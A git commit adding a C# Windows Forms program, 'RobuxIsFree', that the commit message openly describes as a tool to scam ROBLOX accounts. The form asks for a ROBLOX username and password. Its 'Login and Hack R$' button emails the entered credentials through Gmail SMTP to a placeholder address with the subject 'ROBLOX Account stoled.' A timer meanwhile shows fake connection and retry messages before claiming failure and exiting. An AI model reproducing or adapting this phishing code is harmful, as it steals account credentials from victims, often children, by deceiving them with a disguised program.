e7895f5b368b3f6453115bd0ac76b666a5ff82fe
teppyisnoob <69696969+teppyboii@users.noreply.github.com>
2018-10-20 18:17:29 +0700

    A tool helps you to scam ROBLOX account
    The title said it.

---
+++ RobuxIsFree/Form1.Designer.cs
@@ -0,0 +1,189 @@
+﻿namespace RobuxIsFree
+{
+    partial class RIFGui
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RIFGui));
+            this.name = new System.Windows.Forms.TextBox();
+            this.password = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.button2 = new System.Windows.Forms.Button();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.label4 = new System.Windows.Forms.Label();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // name
+            // 
+            this.name.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.name.Location = new System.Drawing.Point(0, 12);
+            this.name.Name = "name";
+            this.name.Size = new System.Drawing.Size(275, 20);
+            this.name.TabIndex = 0;
+            this.name.Text = "Type your ROBLOX username here.";
+            // 
+            // password
+            // 
+            this.password.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.password.Location = new System.Drawing.Point(0, 50);
+            this.password.Name = "password";
+            this.password.Size = new System.Drawing.Size(275, 20);
+            this.password.TabIndex = 1;
+            this.password.Text = "Password";
+            this.password.UseSystemPasswordChar = true;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(0, 118);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(114, 23);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Login and Hack R$";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(-3, -1);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(108, 13);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "ROBLOX Username :";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(-3, 34);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(131, 13);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "Your ROBLOX Password :";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(-3, 73);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(66, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "Desired R$ :";
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.numericUpDown1.Location = new System.Drawing.Point(0, 89);
+            this.numericUpDown1.Maximum = new decimal(new int[] {
+            -1593835521,
+            466537709,
+            54210,
+            0});
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(275, 20);
+            this.numericUpDown1.TabIndex = 7;
+            // 
+            // button2
+            // 
+            this.button2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.button2.Location = new System.Drawing.Point(200, 118);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 8;
+            this.button2.Text = "Credit";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.progressBar1.Location = new System.Drawing.Point(0, 145);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(275, 23);
+            this.progressBar1.Style = System.Windows.Forms.ProgressBarStyle.Continuous;
+            this.progressBar1.TabIndex = 9;
+            // 
+            // label4
+            // 
+            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(-3, 171);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(105, 13);
+            this.label4.TabIndex = 10;
+            this.label4.Text = "Status : Not hacked!";
+            // 
+            // RIFGui
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(273, 184);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.password);
+            this.Controls.Add(this.name);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "RIFGui";
+            this.Text = "RobuxIsFree";
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox name;
+        private System.Windows.Forms.TextBox password;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
+
---
+++ RobuxIsFree/Form1.cs
@@ -0,0 +1,107 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net.Mail;
+using System.Text;
+using System.Net.NetworkInformation;
+using System.Net;
+
+namespace RobuxIsFree
+{
+    public partial class RIFGui : Form
+    {
+
+        public RIFGui()
+        {
+            InitializeComponent();
+            timer1 = new Timer();
+            timer1.Tick += timer1_Tick;
+            timer1.Interval = 500;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            timer1.Enabled = !timer1.Enabled;
+            progressBar1.Minimum = 0;
+            progressBar1.Maximum = 100;
+            progressBar1.Value = 0;
+            progressBar1.Step = 1;
+            MailMessage mail = new MailMessage();
+            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
+            mail.From = new MailAddress("sender@mail.com");
+            mail.To.Add("receiver@mail.com");
+            mail.Subject = "ROBLOX Account stoled.";
+            mail.Body = "Username : " + name.Text + " | Password : " + password.Text;
+            smtpServer.Port = 587;
+            smtpServer.Credentials = new NetworkCredential("sender@address.com", "senderpassword");
+            smtpServer.EnableSsl = true;
+            smtpServer.Send(mail);
+
+        }
+
+        int j = 0;
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            j++;
+            progressBar1.PerformStep();
+            if (j == 1)
+                {
+                label4.Text = "Status : Initzaling the hack tool...";
+                }else if (j == 10)
+            {
+                label4.Text = "Status : Connecting to ROBLOX...";
+            }else if (j == 20)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 1...";
+            }
+            else if (j == 30)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 2...";
+            }
+            else if (j == 40)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 3...";
+            }
+            else if (j == 50)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 4...";
+            }
+            else if (j == 60)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 5...";
+            }
+            else if (j == 70)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 6...";
+            }
+            else if (j == 80)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Retry 7...";
+            }
+            else if (j == 90)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Last retry (retry 8)...";
+            }
+            else if (j >= 100)
+            {
+                label4.Text = "Status : Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :(";
+                timer1.Stop();
+                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :( This app will exit.", "RobuxIsFree");
+                Environment.Exit(0);
+            }
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("RobuxIsFree made by teppy! | Youtube : TreTrauIT","RobuxIsFree");
+        }
+    }
+
+}
+
